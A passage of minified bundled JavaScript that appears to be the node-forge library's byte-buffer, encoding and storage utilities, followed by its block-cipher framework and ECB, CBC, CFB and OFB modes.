m.read=="number")&&(this.data=m.data,this.read=m.read);this._constructedStringLength=0}t.ByteStringBuffer=n;var s=4096;t.ByteStringBuffer.prototype._optimizeConstructedString=function(m){this._constructedStringLength+=m,this._constructedStringLength>s&&(this.data.substr(0,1),this._constructedStringLength=0)},t.ByteStringBuffer.prototype.length=function(){return this.data.length-this.read},t.ByteStringBuffer.prototype.isEmpty=function(){return this.length()<=0},t.ByteStringBuffer.prototype.putByte=function(m){return this.putBytes(String.fromCharCode(m))},t.ByteStringBuffer.prototype.fillWithByte=function(m,x){m=String.fromCharCode(m);for(var S=this.data;x>0;)x&1&&(S+=m),x>>>=1,x>0&&(m+=m);return this.data=S,this._optimizeConstructedString(x),this},t.ByteStringBuffer.prototype.putBytes=function(m){return this.data+=m,this._optimizeConstructedString(m.length),this},t.ByteStringBuffer.prototype.putString=function(m){return this.putBytes(t.encodeUtf8(m))},t.ByteStringBuffer.prototype.putInt16=function(m){return this.putBytes(String.fromCharCode(m>>8&255)+String.fromCharCode(m&255))},t.ByteStringBuffer.prototype.putInt24=function(m){return this.putBytes(String.fromCharCode(m>>16&255)+String.fromCharCode(m>>8&255)+String.fromCharCode(m&255))},t.ByteStringBuffer.prototype.putInt32=function(m){return this.putBytes(String.fromCharCode(m>>24&255)+String.fromCharCode(m>>16&255)+String.fromCharCode(m>>8&255)+String.fromCharCode(m&255))},t.ByteStringBuffer.prototype.putInt16Le=function(m){return this.putBytes(String.fromCharCode(m&255)+String.fromCharCode(m>>8&255))},t.ByteStringBuffer.prototype.putInt24Le=function(m){return this.putBytes(String.fromCharCode(m&255)+String.fromCharCode(m>>8&255)+String.fromCharCode(m>>16&255))},t.ByteStringBuffer.prototype.putInt32Le=function(m){return this.putBytes(String.fromCharCode(m&255)+String.fromCharCode(m>>8&255)+String.fromCharCode(m>>16&255)+String.fromCharCode(m>>24&255))},t.ByteStringBuffer.prototype.putInt=function(m,x){i(x);var S="";do x-=8,S+=String.fromCharCode(m>>x&255);while(x>0);return this.putBytes(S)},t.ByteStringBuffer.prototype.putSignedInt=function(m,x){return m<0&&(m+=2<<x-1),this.putInt(m,x)},t.ByteStringBuffer.prototype.putBuffer=function(m){return this.putBytes(m.getBytes())},t.ByteStringBuffer.prototype.getByte=function(){return this.data.charCodeAt(this.read++)},t.ByteStringBuffer.prototype.getInt16=function(){var m=this.data.charCodeAt(this.read)<<8^this.data.charCodeAt(this.read+1);return this.read+=2,m},t.ByteStringBuffer.prototype.getInt24=function(){var m=this.data.charCodeAt(this.read)<<16^this.data.charCodeAt(this.read+1)<<8^this.data.charCodeAt(this.read+2);return this.read+=3,m},t.ByteStringBuffer.prototype.getInt32=function(){var m=this.data.charCodeAt(this.read)<<24^this.data.charCodeAt(this.read+1)<<16^this.data.charCodeAt(this.read+2)<<8^this.data.charCodeAt(this.read+3);return this.read+=4,m},t.ByteStringBuffer.prototype.getInt16Le=function(){var m=this.data.charCodeAt(this.read)^this.data.charCodeAt(this.read+1)<<8;return this.read+=2,m},t.ByteStringBuffer.prototype.getInt24Le=function(){var m=this.data.charCodeAt(this.read)^this.data.charCodeAt(this.read+1)<<8^this.data.charCodeAt(this.read+2)<<16;return this.read+=3,m},t.ByteStringBuffer.prototype.getInt32Le=function(){var m=this.data.charCodeAt(this.read)^this.data.charCodeAt(this.read+1)<<8^this.data.charCodeAt(this.read+2)<<16^this.data.charCodeAt(this.read+3)<<24;return this.read+=4,m},t.ByteStringBuffer.prototype.getInt=function(m){i(m);var x=0;do x=(x<<8)+this.data.charCodeAt(this.read++),m-=8;while(m>0);return x},t.ByteStringBuffer.prototype.getSignedInt=function(m){var x=this.getInt(m),S=2<<m-2;return x>=S&&(x-=S<<1),x},t.ByteStringBuffer.prototype.getBytes=function(m){var x;return m?(m=Math.min(this.length(),m),x=this.data.slice(this.read,this.read+m),this.read+=m):m===0?x="":(x=this.read===0?this.data:this.data.slice(this.read),this.clear()),x},t.ByteStringBuffer.prototype.bytes=function(m){return typeof m>"u"?this.data.slice(this.read):this.data.slice(this.read,this.read+m)},t.ByteStringBuffer.prototype.at=function(m){return this.data.charCodeAt(this.read+m)},t.ByteStringBuffer.prototype.setAt=function(m,x){return this.data=this.data.substr(0,this.read+m)+String.fromCharCode(x)+this.data.substr(this.read+m+1),this},t.ByteStringBuffer.prototype.last=function(){return this.data.charCodeAt(this.data.length-1)},t.ByteStringBuffer.prototype.copy=function(){var m=t.createBuffer(this.data);return m.read=this.read,m},t.ByteStringBuffer.prototype.compact=function(){return this.read>0&&(this.data=this.data.slice(this.read),this.read=0),this},t.ByteStringBuffer.prototype.clear=function(){return this.data="",this.read=0,this},t.ByteStringBuffer.prototype.truncate=function(m){var x=Math.max(0,this.length()-m);return this.data=this.data.substr(this.read,x),this.read=0,this},t.ByteStringBuffer.prototype.toHex=function(){for(var m="",x=this.read;x<this.data.length;++x){var S=this.data.charCodeAt(x);S<16&&(m+="0"),m+=S.toString(16)}return m},t.ByteStringBuffer.prototype.toString=function(){return t.decodeUtf8(this.bytes())};function o(m,x){x=x||{},this.read=x.readOffset||0,this.growSize=x.growSize||1024;var S=t.isArrayBuffer(m),T=t.isArrayBufferView(m);if(S||T){S?this.data=new DataView(m):this.data=new DataView(m.buffer,m.byteOffset,m.byteLength),this.write="writeOffset"in x?x.writeOffset:this.data.byteLength;return}this.data=new DataView(new ArrayBuffer(0)),this.write=0,m!=null&&this.putBytes(m),"writeOffset"in x&&(this.write=x.writeOffset)}t.DataBuffer=o,t.DataBuffer.prototype.length=function(){return this.write-this.read},t.DataBuffer.prototype.isEmpty=function(){return this.length()<=0},t.DataBuffer.prototype.accommodate=function(m,x){if(this.length()>=m)return this;x=Math.max(x||this.growSize,m);var S=new Uint8Array(this.data.buffer,this.data.byteOffset,this.data.byteLength),T=new Uint8Array(this.length()+x);return T.set(S),this.data=new DataView(T.buffer),this},t.DataBuffer.prototype.putByte=function(m){return this.accommodate(1),this.data.setUint8(this.write++,m),this},t.DataBuffer.prototype.fillWithByte=function(m,x){this.accommodate(x);for(var S=0;S<x;++S)this.data.setUint8(m);return this},t.DataBuffer.prototype.putBytes=function(m,x){if(t.isArrayBufferView(m)){var S=new Uint8Array(m.buffer,m.byteOffset,m.byteLength),T=S.byteLength-S.byteOffset;this.accommodate(T);var k=new Uint8Array(this.data.buffer,this.write);return k.set(S),this.write+=T,this}if(t.isArrayBuffer(m)){var S=new Uint8Array(m);this.accommodate(S.byteLength);var k=new Uint8Array(this.data.buffer);return k.set(S,this.write),this.write+=S.byteLength,this}if(m instanceof t.DataBuffer||typeof m=="object"&&typeof m.read=="number"&&typeof m.write=="number"&&t.isArrayBufferView(m.data)){var S=new Uint8Array(m.data.byteLength,m.read,m.length());this.accommodate(S.byteLength);var k=new Uint8Array(m.data.byteLength,this.write);return k.set(S),this.write+=S.byteLength,this}if(m instanceof t.ByteStringBuffer&&(m=m.data,x="binary"),x=x||"binary",typeof m=="string"){var I;if(x==="hex")return this.accommodate(Math.ceil(m.length/2)),I=new Uint8Array(this.data.buffer,this.write),this.write+=t.binary.hex.decode(m,I,this.write),this;if(x==="base64")return this.accommodate(Math.ceil(m.length/4)*3),I=new Uint8Array(this.data.buffer,this.write),this.write+=t.binary.base64.decode(m,I,this.write),this;if(x==="utf8"&&(m=t.encodeUtf8(m),x="binary"),x==="binary"||x==="raw")return this.accommodate(m.length),I=new Uint8Array(this.data.buffer,this.write),this.write+=t.binary.raw.decode(I),this;if(x==="utf16")return this.accommodate(m.length*2),I=new Uint16Array(this.data.buffer,this.write),this.write+=t.text.utf16.encode(I),this;throw new Error("Invalid encoding: "+x)}throw Error("Invalid parameter: "+m)},t.DataBuffer.prototype.putBuffer=function(m){return this.putBytes(m),m.clear(),this},t.DataBuffer.prototype.putString=function(m){return this.putBytes(m,"utf16")},t.DataBuffer.prototype.putInt16=function(m){return this.accommodate(2),this.data.setInt16(this.write,m),this.write+=2,this},t.DataBuffer.prototype.putInt24=function(m){return this.accommodate(3),this.data.setInt16(this.write,m>>8&65535),this.data.setInt8(this.write,m>>16&255),this.write+=3,this},t.DataBuffer.prototype.putInt32=function(m){return this.accommodate(4),this.data.setInt32(this.write,m),this.write+=4,this},t.DataBuffer.prototype.putInt16Le=function(m){return this.accommodate(2),this.data.setInt16(this.write,m,!0),this.write+=2,this},t.DataBuffer.prototype.putInt24Le=function(m){return this.accommodate(3),this.data.setInt8(this.write,m>>16&255),this.data.setInt16(this.write,m>>8&65535,!0),this.write+=3,this},t.DataBuffer.prototype.putInt32Le=function(m){return this.accommodate(4),this.data.setInt32(this.write,m,!0),this.write+=4,this},t.DataBuffer.prototype.putInt=function(m,x){i(x),this.accommodate(x/8);do x-=8,this.data.setInt8(this.write++,m>>x&255);while(x>0);return this},t.DataBuffer.prototype.putSignedInt=function(m,x){return i(x),this.accommodate(x/8),m<0&&(m+=2<<x-1),this.putInt(m,x)},t.DataBuffer.prototype.getByte=function(){return this.data.getInt8(this.read++)},t.DataBuffer.prototype.getInt16=function(){var m=this.data.getInt16(this.read);return this.read+=2,m},t.DataBuffer.prototype.getInt24=function(){var m=this.data.getInt16(this.read)<<8^this.data.getInt8(this.read+2);return this.read+=3,m},t.DataBuffer.prototype.getInt32=function(){var m=this.data.getInt32(this.read);return this.read+=4,m},t.DataBuffer.prototype.getInt16Le=function(){var m=this.data.getInt16(this.read,!0);return this.read+=2,m},t.DataBuffer.prototype.getInt24Le=function(){var m=this.data.getInt8(this.read)^this.data.getInt16(this.read+1,!0)<<8;return this.read+=3,m},t.DataBuffer.prototype.getInt32Le=function(){var m=this.data.getInt32(this.read,!0);return this.read+=4,m},t.DataBuffer.prototype.getInt=function(m){i(m);var x=0;do x=(x<<8)+this.data.getInt8(this.read++),m-=8;while(m>0);return x},t.DataBuffer.prototype.getSignedInt=function(m){var x=this.getInt(m),S=2<<m-2;return x>=S&&(x-=S<<1),x},t.DataBuffer.prototype.getBytes=function(m){var x;return m?(m=Math.min(this.length(),m),x=this.data.slice(this.read,this.read+m),this.read+=m):m===0?x="":(x=this.read===0?this.data:this.data.slice(this.read),this.clear()),x},t.DataBuffer.prototype.bytes=function(m){return typeof m>"u"?this.data.slice(this.read):this.data.slice(this.read,this.read+m)},t.DataBuffer.prototype.at=function(m){return this.data.getUint8(this.read+m)},t.DataBuffer.prototype.setAt=function(m,x){return this.data.setUint8(m,x),this},t.DataBuffer.prototype.last=function(){return this.data.getUint8(this.write-1)},t.DataBuffer.prototype.copy=function(){return new t.DataBuffer(this)},t.DataBuffer.prototype.compact=function(){if(this.read>0){var m=new Uint8Array(this.data.buffer,this.read),x=new Uint8Array(m.byteLength);x.set(m),this.data=new DataView(x),this.write-=this.read,this.read=0}return this},t.DataBuffer.prototype.clear=function(){return this.data=new DataView(new ArrayBuffer(0)),this.read=this.write=0,this},t.DataBuffer.prototype.truncate=function(m){return this.write=Math.max(0,this.length()-m),this.read=Math.min(this.read,this.write),this},t.DataBuffer.prototype.toHex=function(){for(var m="",x=this.read;x<this.data.byteLength;++x){var S=this.data.getUint8(x);S<16&&(m+="0"),m+=S.toString(16)}return m},t.DataBuffer.prototype.toString=function(m){var x=new Uint8Array(this.data,this.read,this.length());if(m=m||"utf8",m==="binary"||m==="raw")return t.binary.raw.encode(x);if(m==="hex")return t.binary.hex.encode(x);if(m==="base64")return t.binary.base64.encode(x);if(m==="utf8")return t.text.utf8.decode(x);if(m==="utf16")return t.text.utf16.decode(x);throw new Error("Invalid encoding: "+m)},t.createBuffer=function(m,x){return x=x||"raw",m!==void 0&&x==="utf8"&&(m=t.encodeUtf8(m)),new t.ByteBuffer(m)},t.fillString=function(m,x){for(var S="";x>0;)x&1&&(S+=m),x>>>=1,x>0&&(m+=m);return S},t.xorBytes=function(m,x,S){for(var T="",k="",I="",E=0,C=0;S>0;--S,++E)k=m.charCodeAt(E)^x.charCodeAt(E),C>=10&&(T+=I,I="",C=0),I+=String.fromCharCode(k),++C;return T+=I,T},t.hexToBytes=function(m){var x="",S=0;for(m.length&!0&&(S=1,x+=String.fromCharCode(parseInt(m[0],16)));S<m.length;S+=2)x+=String.fromCharCode(parseInt(m.substr(S,2),16));return x},t.bytesToHex=function(m){return t.createBuffer(m).toHex()},t.int32ToBytes=function(m){return String.fromCharCode(m>>24&255)+String.fromCharCode(m>>16&255)+String.fromCharCode(m>>8&255)+String.fromCharCode(m&255)};var a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",c=[62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,64,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51],l="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";t.encode64=function(m,x){for(var S="",T="",k,I,E,C=0;C<m.length;)k=m.charCodeAt(C++),I=m.charCodeAt(C++),E=m.charCodeAt(C++),S+=a.charAt(k>>2),S+=a.charAt((k&3)<<4|I>>4),isNaN(I)?S+="==":(S+=a.charAt((I&15)<<2|E>>6),S+=isNaN(E)?"=":a.charAt(E&63)),x&&S.length>x&&(T+=S.substr(0,x)+`\r
`,S=S.substr(x));return T+=S,T},t.decode64=function(m){m=m.replace(/[^A-Za-z0-9\+\/\=]/g,"");for(var x="",S,T,k,I,E=0;E<m.length;)S=c[m.charCodeAt(E++)-43],T=c[m.charCodeAt(E++)-43],k=c[m.charCodeAt(E++)-43],I=c[m.charCodeAt(E++)-43],x+=String.fromCharCode(S<<2|T>>4),k!==64&&(x+=String.fromCharCode((T&15)<<4|k>>2),I!==64&&(x+=String.fromCharCode((k&3)<<6|I)));return x},t.encodeUtf8=function(m){return unescape(encodeURIComponent(m))},t.decodeUtf8=function(m){return decodeURIComponent(escape(m))},t.binary={raw:{},hex:{},base64:{},base58:{},baseN:{encode:e.encode,decode:e.decode}},t.binary.raw.encode=function(m){return String.fromCharCode.apply(null,m)},t.binary.raw.decode=function(m,x,S){var T=x;T||(T=new Uint8Array(m.length)),S=S||0;for(var k=S,I=0;I<m.length;++I)T[k++]=m.charCodeAt(I);return x?k-S:T},t.binary.hex.encode=t.bytesToHex,t.binary.hex.decode=function(m,x,S){var T=x;T||(T=new Uint8Array(Math.ceil(m.length/2))),S=S||0;var k=0,I=S;for(m.length&1&&(k=1,T[I++]=parseInt(m[0],16));k<m.length;k+=2)T[I++]=parseInt(m.substr(k,2),16);return x?I-S:T},t.binary.base64.encode=function(m,x){for(var S="",T="",k,I,E,C=0;C<m.byteLength;)k=m[C++],I=m[C++],E=m[C++],S+=a.charAt(k>>2),S+=a.charAt((k&3)<<4|I>>4),isNaN(I)?S+="==":(S+=a.charAt((I&15)<<2|E>>6),S+=isNaN(E)?"=":a.charAt(E&63)),x&&S.length>x&&(T+=S.substr(0,x)+`\r
`,S=S.substr(x));return T+=S,T},t.binary.base64.decode=function(m,x,S){var T=x;T||(T=new Uint8Array(Math.ceil(m.length/4)*3)),m=m.replace(/[^A-Za-z0-9\+\/\=]/g,""),S=S||0;for(var k,I,E,C,N=0,L=S;N<m.length;)k=c[m.charCodeAt(N++)-43],I=c[m.charCodeAt(N++)-43],E=c[m.charCodeAt(N++)-43],C=c[m.charCodeAt(N++)-43],T[L++]=k<<2|I>>4,E!==64&&(T[L++]=(I&15)<<4|E>>2,C!==64&&(T[L++]=(E&3)<<6|C));return x?L-S:T.subarray(0,L)},t.binary.base58.encode=function(m,x){return t.binary.baseN.encode(m,l,x)},t.binary.base58.decode=function(m,x){return t.binary.baseN.decode(m,l,x)},t.text={utf8:{},utf16:{}},t.text.utf8.encode=function(m,x,S){m=t.encodeUtf8(m);var T=x;T||(T=new Uint8Array(m.length)),S=S||0;for(var k=S,I=0;I<m.length;++I)T[k++]=m.charCodeAt(I);return x?k-S:T},t.text.utf8.decode=function(m){return t.decodeUtf8(String.fromCharCode.apply(null,m))},t.text.utf16.encode=function(m,x,S){var T=x;T||(T=new Uint8Array(m.length*2));var k=new Uint16Array(T.buffer);S=S||0;for(var I=S,E=S,C=0;C<m.length;++C)k[E++]=m.charCodeAt(C),I+=2;return x?I-S:T},t.text.utf16.decode=function(m){return String.fromCharCode.apply(null,new Uint16Array(m.buffer))},t.deflate=function(m,x,S){if(x=t.decode64(m.deflate(t.encode64(x)).rval),S){var T=2,k=x.charCodeAt(1);k&32&&(T=6),x=x.substring(T,x.length-4)}return x},t.inflate=function(m,x,S){var T=m.inflate(t.encode64(x)).rval;return T===null?null:t.decode64(T)};var u=function(m,x,S){if(!m)throw new Error("WebStorage not available.");var T;if(S===null?T=m.removeItem(x):(S=t.encode64(JSON.stringify(S)),T=m.setItem(x,S)),typeof T<"u"&&T.rval!==!0){var k=new Error(T.error.message);throw k.id=T.error.id,k.name=T.error.name,k}},d=function(m,x){if(!m)throw new Error("WebStorage not available.");var S=m.getItem(x);if(m.init)if(S.rval===null){if(S.error){var T=new Error(S.error.message);throw T.id=S.error.id,T.name=S.error.name,T}S=null}else S=S.rval;return S!==null&&(S=JSON.parse(t.decode64(S))),S},h=function(m,x,S,T){var k=d(m,x);k===null&&(k={}),k[S]=T,u(m,x,k)},f=function(m,x,S){var T=d(m,x);return T!==null&&(T=S in T?T[S]:null),T},p=function(m,x,S){var T=d(m,x);if(T!==null&&S in T){delete T[S];var k=!0;for(var I in T){k=!1;break}k&&(T=null),u(m,x,T)}},g=function(m,x){u(m,x,null)},w=function(m,x,S){var T=null;typeof S>"u"&&(S=["web","flash"]);var k,I=!1,E=null;for(var C in S){k=S[C];try{if(k==="flash"||k==="both"){if(x[0]===null)throw new Error("Flash local storage not available.");T=m.apply(this,x),I=k==="flash"}(k==="web"||k==="both")&&(x[0]=localStorage,T=m.apply(this,x),I=!0)}catch(N){E=N}if(I)break}if(!I)throw E;return T};return t.setItem=function(m,x,S,T,k){w(h,arguments,k)},t.getItem=function(m,x,S,T){return w(f,arguments,T)},t.removeItem=function(m,x,S,T){w(p,arguments,T)},t.clearItems=function(m,x,S){w(g,arguments,S)},t.isEmpty=function(m){for(var x in m)if(m.hasOwnProperty(x))return!1;return!0},t.format=function(m){for(var x=/%./g,S,T,k=0,I=[],E=0;S=x.exec(m);){T=m.substring(E,x.lastIndex-2),T.length>0&&I.push(T),E=x.lastIndex;var C=S[0][1];switch(C){case"s":case"o":k<arguments.length?I.push(arguments[k+++1]):I.push("<?>");break;case"%":I.push("%");break;default:I.push("<%"+C+"?>")}}return I.push(m.substring(E)),I.join("")},t.formatNumber=function(m,x,S,T){var k=m,I=isNaN(x=Math.abs(x))?2:x,E=S===void 0?",":S,C=T===void 0?".":T,N=k<0?"-":"",L=parseInt(k=Math.abs(+k||0).toFixed(I),10)+"",$=L.length>3?L.length%3:0;return N+($?L.substr(0,$)+C:"")+L.substr($).replace(/(\d{3})(?=\d)/g,"$1"+C)+(I?E+Math.abs(k-L).toFixed(I).slice(2):"")},t.formatSize=function(m){return m>=1073741824?m=t.formatNumber(m/1073741824,2,".","")+" GiB":m>=1048576?m=t.formatNumber(m/1048576,2,".","")+" MiB":m>=1024?m=t.formatNumber(m/1024,0)+" KiB":m=t.formatNumber(m,0)+" bytes",m},t.bytesFromIP=function(m){return m.indexOf(".")!==-1?t.bytesFromIPv4(m):m.indexOf(":")!==-1?t.bytesFromIPv6(m):null},t.bytesFromIPv4=function(m){if(m=m.split("."),m.length!==4)return null;for(var x=t.createBuffer(),S=0;S<m.length;++S){var T=parseInt(m[S],10);if(isNaN(T))return null;x.putByte(T)}return x.getBytes()},t.bytesFromIPv6=function(m){var x=0;m=m.split(":").filter(function(E){return E.length===0&&++x,!0});for(var S=(8-m.length+x)*2,T=t.createBuffer(),k=0;k<8;++k){if(!m[k]||m[k].length===0){T.fillWithByte(0,S),S=0;continue}var I=t.hexToBytes(m[k]);I.length<2&&T.putByte(0),T.putBytes(I)}return T.getBytes()},t.bytesToIP=function(m){return m.length===4?t.bytesToIPv4(m):m.length===16?t.bytesToIPv6(m):null},t.bytesToIPv4=function(m){if(m.length!==4)return null;for(var x=[],S=0;S<m.length;++S)x.push(m.charCodeAt(S));return x.join(".")},t.bytesToIPv6=function(m){if(m.length!==16)return null;for(var x=[],S=[],T=0,k=0;k<m.length;k+=2){for(var I=t.bytesToHex(m[k]+m[k+1]);I[0]==="0"&&I!=="0";)I=I.substr(1);if(I==="0"){var E=S[S.length-1],C=x.length;!E||C!==E.end+1?S.push({start:C,end:C}):(E.end=C,E.end-E.start>S[T].end-S[T].start&&(T=S.length-1))}x.push(I)}if(S.length>0){var N=S[T];N.end-N.start>0&&(x.splice(N.start,N.end-N.start+1,""),N.start===0&&x.unshift(""),N.end===7&&x.push(""))}return x.join(":")},t.estimateCores=function(m,x){if(typeof m=="function"&&(x=m,m={}),m=m||{},"cores"in t&&!m.update)return x(null,t.cores);if(typeof navigator<"u"&&"hardwareConcurrency"in navigator&&navigator.hardwareConcurrency>0)return t.cores=navigator.hardwareConcurrency,x(null,t.cores);if(typeof Worker>"u")return t.cores=1,x(null,t.cores);if(typeof Blob>"u")return t.cores=2,x(null,t.cores);var S=URL.createObjectURL(new Blob(["(",(function(){self.addEventListener("message",function(E){var C=Date.now(),N=C+4;self.postMessage({st:C,et:N})})}).toString(),")()"],{type:"application/javascript"}));T([],5,16);function T(E,C,N){if(C===0){var L=Math.floor(E.reduce(function($,y){return $+y},0)/E.length);return t.cores=Math.max(1,L),URL.revokeObjectURL(S),x(null,t.cores)}k(N,function($,y){E.push(I(N,y)),T(E,C-1,N)})}function k(E,C){for(var N=[],L=[],$=0;$<E;++$){var y=new Worker(S);y.addEventListener("message",function(A){if(L.push(A.data),L.length===E){for(var b=0;b<E;++b)N[b].terminate();C(null,L)}}),N.push(y)}for(var $=0;$<E;++$)N[$].postMessage($)}function I(E,C){for(var N=[],L=0;L<E;++L)for(var $=C[L],y=N[L]=[],A=0;A<E;++A)if(L!==A){var b=C[A];($.st>b.st&&$.st<b.et||b.st>$.st&&b.st<$.et)&&y.push(A)}return N.reduce(function(v,_){return Math.max(v,_.length)},0)}},p_.exports}var m_,_D;function q$(){if(_D)return m_;_D=1;var r=Lr();Ei(),m_=r.cipher=r.cipher||{},r.cipher.algorithms=r.cipher.algorithms||{},r.cipher.createCipher=function(t,i){var n=t;if(typeof n=="string"&&(n=r.cipher.getAlgorithm(n),n&&(n=n())),!n)throw new Error("Unsupported algorithm: "+t);return new r.cipher.BlockCipher({algorithm:n,key:i,decrypt:!1})},r.cipher.createDecipher=function(t,i){var n=t;if(typeof n=="string"&&(n=r.cipher.getAlgorithm(n),n&&(n=n())),!n)throw new Error("Unsupported algorithm: "+t);return new r.cipher.BlockCipher({algorithm:n,key:i,decrypt:!0})},r.cipher.registerAlgorithm=function(t,i){t=t.toUpperCase(),r.cipher.algorithms[t]=i},r.cipher.getAlgorithm=function(t){return t=t.toUpperCase(),t in r.cipher.algorithms?r.cipher.algorithms[t]:null};var e=r.cipher.BlockCipher=function(t){this.algorithm=t.algorithm,this.mode=this.algorithm.mode,this.blockSize=this.mode.blockSize,this._finish=!1,this._input=null,this.output=null,this._op=t.decrypt?this.mode.decrypt:this.mode.encrypt,this._decrypt=t.decrypt,this.algorithm.initialize(t)};return e.prototype.start=function(t){t=t||{};var i={};for(var n in t)i[n]=t[n];i.decrypt=this._decrypt,this._finish=!1,this._input=r.util.createBuffer(),this.output=t.output||r.util.createBuffer(),this.mode.start(i)},e.prototype.update=function(t){for(t&&this._input.putBuffer(t);!this._op.call(this.mode,this._input,this.output,this._finish)&&!this._finish;);this._input.compact()},e.prototype.finish=function(t){t&&(this.mode.name==="ECB"||this.mode.name==="CBC")&&(this.mode.pad=function(n){return t(this.blockSize,n,!1)},this.mode.unpad=function(n){return t(this.blockSize,n,!0)});var i={};return i.decrypt=this._decrypt,i.overflow=this._input.length()%this.blockSize,!(!this._decrypt&&this.mode.pad&&!this.mode.pad(this._input,i)||(this._finish=!0,this.update(),this._decrypt&&this.mode.unpad&&!this.mode.unpad(this.output,i))||this.mode.afterFinish&&!this.mode.afterFinish(this.output,i))},m_}var w_={exports:{}},SD;function dJ(){if(SD)return w_.exports;SD=1;var r=Lr();Ei(),r.cipher=r.cipher||{};var e=w_.exports=r.cipher.modes=r.cipher.modes||{};e.ecb=function(s){s=s||{},this.name="ECB",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=new Array(this._ints),this._outBlock=new Array(this._ints)},e.ecb.prototype.start=function(s){},e.ecb.prototype.encrypt=function(s,o,a){if(s.length()<this.blockSize&&!(a&&s.length()>0))return!0;for(var c=0;c<this._ints;++c)this._inBlock[c]=s.getInt32();this.cipher.encrypt(this._inBlock,this._outBlock);for(var c=0;c<this._ints;++c)o.putInt32(this._outBlock[c])},e.ecb.prototype.decrypt=function(s,o,a){if(s.length()<this.blockSize&&!(a&&s.length()>0))return!0;for(var c=0;c<this._ints;++c)this._inBlock[c]=s.getInt32();this.cipher.decrypt(this._inBlock,this._outBlock);for(var c=0;c<this._ints;++c)o.putInt32(this._outBlock[c])},e.ecb.prototype.pad=function(s,o){var a=s.length()===this.blockSize?this.blockSize:this.blockSize-s.length();return s.fillWithByte(a,a),!0},e.ecb.prototype.unpad=function(s,o){if(o.overflow>0)return!1;var a=s.length(),c=s.at(a-1);return c>this.blockSize<<2?!1:(s.truncate(c),!0)},e.cbc=function(s){s=s||{},this.name="CBC",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=new Array(this._ints),this._outBlock=new Array(this._ints)},e.cbc.prototype.start=function(s){if(s.iv===null){if(!this._prev)throw new Error("Invalid IV parameter.");this._iv=this._prev.slice(0)}else if("iv"in s)this._iv=t(s.iv,this.blockSize),this._prev=this._iv.slice(0);else throw new Error("Invalid IV parameter.")},e.cbc.prototype.encrypt=function(s,o,a){if(s.length()<this.blockSize&&!(a&&s.length()>0))return!0;for(var c=0;c<this._ints;++c)this._inBlock[c]=this._prev[c]^s.getInt32();this.cipher.encrypt(this._inBlock,this._outBlock);for(var c=0;c<this._ints;++c)o.putInt32(this._outBlock[c]);this._prev=this._outBlock},e.cbc.prototype.decrypt=function(s,o,a){if(s.length()<this.blockSize&&!(a&&s.length()>0))return!0;for(var c=0;c<this._ints;++c)this._inBlock[c]=s.getInt32();this.cipher.decrypt(this._inBlock,this._outBlock);for(var c=0;c<this._ints;++c)o.putInt32(this._prev[c]^this._outBlock[c]);this._prev=this._inBlock.slice(0)},e.cbc.prototype.pad=function(s,o){var a=s.length()===this.blockSize?this.blockSize:this.blockSize-s.length();return s.fillWithByte(a,a),!0},e.cbc.prototype.unpad=function(s,o){if(o.overflow>0)return!1;var a=s.length(),c=s.at(a-1);return c>this.blockSize<<2?!1:(s.truncate(c),!0)},e.cfb=function(s){s=s||{},this.name="CFB",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=null,this._outBlock=new Array(this._ints),this._partialBlock=new Array(this._ints),this._partialOutput=r.util.createBuffer(),this._partialBytes=0},e.cfb.prototype.start=function(s){if(!("iv"in s))throw new Error("Invalid IV parameter.");this._iv=t(s.iv,this.blockSize),this._inBlock=this._iv.slice(0),this._partialBytes=0},e.cfb.prototype.encrypt=function(s,o,a){var c=s.length();if(c===0)return!0;if(this.cipher.encrypt(this._inBlock,this._outBlock),this._partialBytes===0&&c>=this.blockSize){for(var l=0;l<this._ints;++l)this._inBlock[l]=s.getInt32()^this._outBlock[l],o.putInt32(this._inBlock[l]);return}var u=(this.blockSize-c)%this.blockSize;u>0&&(u=this.blockSize-u),this._partialOutput.clear();for(var l=0;l<this._ints;++l)this._partialBlock[l]=s.getInt32()^this._outBlock[l],this._partialOutput.putInt32(this._partialBlock[l]);if(u>0)s.read-=this.blockSize;else for(var l=0;l<this._ints;++l)this._inBlock[l]=this._partialBlock[l];if(this._partialBytes>0&&this._partialOutput.getBytes(this._partialBytes),u>0&&!a)return o.putBytes(this._partialOutput.getBytes(u-this._partialBytes)),this._partialBytes=u,!0;o.putBytes(this._partialOutput.getBytes(c-this._partialBytes)),this._partialBytes=0},e.cfb.prototype.decrypt=function(s,o,a){var c=s.length();if(c===0)return!0;if(this.cipher.encrypt(this._inBlock,this._outBlock),this._partialBytes===0&&c>=this.blockSize){for(var l=0;l<this._ints;++l)this._inBlock[l]=s.getInt32(),o.putInt32(this._inBlock[l]^this._outBlock[l]);return}var u=(this.blockSize-c)%this.blockSize;u>0&&(u=this.blockSize-u),this._partialOutput.clear();for(var l=0;l<this._ints;++l)this._partialBlock[l]=s.getInt32(),this._partialOutput.putInt32(this._partialBlock[l]^this._outBlock[l]);if(u>0)s.read-=this.blockSize;else for(var l=0;l<this._ints;++l)this._inBlock[l]=this._partialBlock[l];if(this._partialBytes>0&&this._partialOutput.getBytes(this._partialBytes),u>0&&!a)return o.putBytes(this._partialOutput.getBytes(u-this._partialBytes)),this._partialBytes=u,!0;o.putBytes(this._partialOutput.getBytes(c-this._partialBytes)),this._partialBytes=0},e.ofb=function(s){s=s||{},this.name="OFB",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=null,this._outBlock=new Array(this._ints),this._partialOutput=r.util.createBuffer(),this._partialBytes=0},e.ofb.prototype.start=function(s){if(!("iv"in s))throw new Error("Invalid IV parameter.");this._iv=t(s.iv,this.blockSize),this._inBlock=this._iv.slice(0),this._partialBytes=0},e.ofb.prototype.encrypt=function(s,o,a){var 